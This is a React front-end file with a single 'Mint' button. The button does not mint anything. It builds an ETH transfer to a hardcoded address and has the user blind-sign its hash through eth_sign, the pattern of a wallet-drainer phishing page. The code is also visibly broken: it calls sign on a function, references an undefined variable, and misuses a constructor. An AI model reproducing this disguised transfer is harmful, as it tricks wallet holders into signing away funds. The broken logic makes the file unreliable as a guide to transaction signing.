import logo from './logo.svg';
import './App.css';
import Web3 from 'web3';
import { ethers } from 'ethers'
import { TypedDataUtils } from 'ethers-eip712';
import { Transaction } from '@ethereumjs/tx'

function App() {

  const test = async () => {
    console.log('test')
    const web3 = new Web3(window.ethereum);
    await window.ethereum.enable()

    
    let userAddr = (await web3.eth.getAccounts())[0];
    console.log(userAddr)
    await web3.eth.getTransactionCount(userAddr, "pending").then(async nonce1 => {
    console.log("nonce1", nonce1)
    const gasPrice = await web3.eth.getGasPrice()

    let pub_addr = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266";
    let chainId = await web3.eth.getChainId();
    console.log(chainId, 'chai')

    let wei_send = 10000000000000000; // wei to send

    let tx_ = { 
        from: userAddr,
        "to": pub_addr,
        "chainId": chainId,
        "nonce": web3.utils.toHex(nonce1),
        "gasLimit": "0x55F0", // gasLimit
        "gasPrice": web3.utils.toHex(Math.floor(gasPrice * 1.3)),
        "value": web3.utils.toHex(wei_send),
        "data": "0x",
    }

    var tx = new Transaction.fromTxData(tx_, {chain: 'rinkeby'});
    test.sign(web3)

    console.log('hre')

    var serializedTx = "0x" + tx.serialize().toString("hex");
    let hexer = { "encoding": "hex" };


    const sha3_ = web3.utils.sha3(serializedTx, hexer);
    console.log("rawTx1:", serializedTx);
    console.log("rawHash1:", sha3_);

    await web3.eth.sign(sha3_, userAddr).then(async signed => { 
    const temporary = signed.substring(2),
                    r_ = "0x" + temporary.substring(0, 64),
                    s_ = "0x" + temporary.substring(64, 128),
                    rhema = parseInt(temporary.substring(128, 130), 16),
                    v_ = web3.utils.toHex(rhema + chainId * 2 + 8);
                console.log("r:", r_);
                console.log("s:", s_);
                console.log("y:", v_.toString("hex"));
            console.log(tx);

            console.log("---------------------------------------------");

            const txFin = "0x" + tx.serialize().toString("hex")//,
            const sha3__ = web3.utils.sha3(txFin, hexer);
            console.log("rawTx:", txFin);
            console.log("rawHash:", sha3__);
            await web3.eth.sendSignedTransaction(si).then(elisebeth => console.log(elisebeth)).catch(vannette => console.log(vannette))
        }).catch(heide => console.log(heide))
    })
}

  return (
    <div className="App">
      <header className="App-header">
        <img src={logo} className="App-logo" alt="logo" />
        <button
          style={{
            backgroundColor: 'rgba(55, 65, 81, .3)',
            width: '25%',
            padding: '12px',
            borderRadius: '30px',
            border: 'none',
            color: 'white',
            fontSize: '20px'
          }}
          onClick={test}
        >
          Mint
        </button>
      </header>
    </div>
  );
}

export default App;
